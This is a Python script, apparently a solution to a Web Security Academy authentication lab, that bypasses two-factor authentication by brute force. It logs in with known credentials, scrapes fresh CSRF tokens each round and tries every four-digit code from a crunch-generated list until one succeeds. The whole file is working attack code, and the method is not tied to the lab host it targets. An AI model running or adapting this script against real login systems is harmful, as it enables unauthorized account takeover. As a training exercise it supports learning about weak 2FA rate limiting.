#!/usr/bin/env python3

#Author: Mohd Badrudduja
#Title: 2FA bypass using a brute-force attack
#Module: Authentication Lab08 (Web Security Academy)
#Execution: Generate the otp file with crunch and put it in the script & change the header values accordingly.
#Command: crunch 4 4 0123456789
#python3 lab08-exploit.py 

import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.session()

url1 = "https://0a4b005e03627574c4ea4bf200aa0090.web-security-academy.net/login"
url2 = "https://0a4b005e03627574c4ea4bf200aa0090.web-security-academy.net/login2"

def get_csrf1(url):
    r = session.get(url=url, verify=False)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    csrf1 = soup.find('input', {'name': 'csrf'}) ['value']
    if csrf1:
        return csrf1
    else:
        print("[+] Something went wrong. We didn't find the CSRF TOKEN.")
        
def post_step1(url):
    csrf = get_csrf1(url1)
    data = {'csrf': csrf, 'username': 'carlos', 'password': 'montoya'}
    r = session.post(url=url, data=data, verify=False, allow_redirects=True)
    res = r.text
    if "Please enter" in res:
        soup = BeautifulSoup(res, 'html.parser')
        csrf2 = soup.find('input', {'name': 'csrf'}) ['value']
        return csrf2
        session.close()
        
def post_step2(url):
    with open('/root/Desktop/authentication/otp.txt', 'r') as outfile:
        otps = outfile.read().split('\n')
    for otp in otps:
        csrf = post_step1(url1)    
        data = {'csrf': csrf, 'mfa-code': otp}
        r = session.post(url=url, data=data, verify=False, proxies=proxies, allow_redirects=True)
        res = r.text
        if "carlos" in res:
            print("[+] Valid OTP for carlos is: " + otp)
            break
    
        
#get_csrf1(url1)
#post_step1(url1)
post_step2(url2)
